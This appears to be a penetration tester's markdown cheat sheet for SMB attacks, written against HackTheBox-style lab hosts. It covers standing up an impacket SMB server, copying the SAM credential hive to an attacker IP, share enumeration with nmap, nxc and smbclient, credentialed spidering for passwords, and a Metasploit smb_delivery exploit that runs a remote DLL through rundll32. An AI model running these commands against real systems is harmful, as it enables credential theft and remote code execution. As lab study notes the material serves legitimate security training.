# SMB 

*Server Creation*

> [!Attention] Must make the directory before you can use it 
> 

```bash 
mkdir share 
impacket-smbserver -smb2support share share 

```


```shell
mkdir share 
impacket-smbserver -smb2support share share -u username -p password
# Adds credentials 
```


*File Transfer*
```powershell prompt:" C:/Users/htb-student/Desktop"
cp hklm/sam \\10.10.15.79\share 
```

# Enumeration 

*Nmap Modules*

## No Credentials

```bash

sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <host>

sudo nmap --script smb-os-discovery.nse -p445 <target>

sudo nmap –script smb-enum-users.nse -p445

sudo nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 <target>
```


*Enumerating Shares*
```bash
sudo nmap -sV -sC -A ip -p 445 

nxc smb ip -u guest - p '' --shares 

smbclient -N -L //ip

nxc smb ip 

```


*Connecting to Shares*
```
smbmap -H ip 

```

## With Credentials 

*Searching Shares*
https://github.com/blacklanternsecurity/MANSPIDER
```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```

*Downloading all files 
```bash
nxc smb 10.129.234.173 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True
```

```bash
smbclient -N -L //ip/share -u username --password= 

```

Windows 
```powershell
Import-Module .\PowerHuntShares.psm1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```


# Exploitation 

Requires 
- Logged into target machine 
```bash
sudo msfconsole -q 
use exploit/windows/smb/smb_delivery
set SRVHOST tun0 
set LHOST tun0
exploit
rundll32.exe \\10.10.14.72\xYBi\test.dll,0
session -i 1 
shell
```

# Post Exploitation 
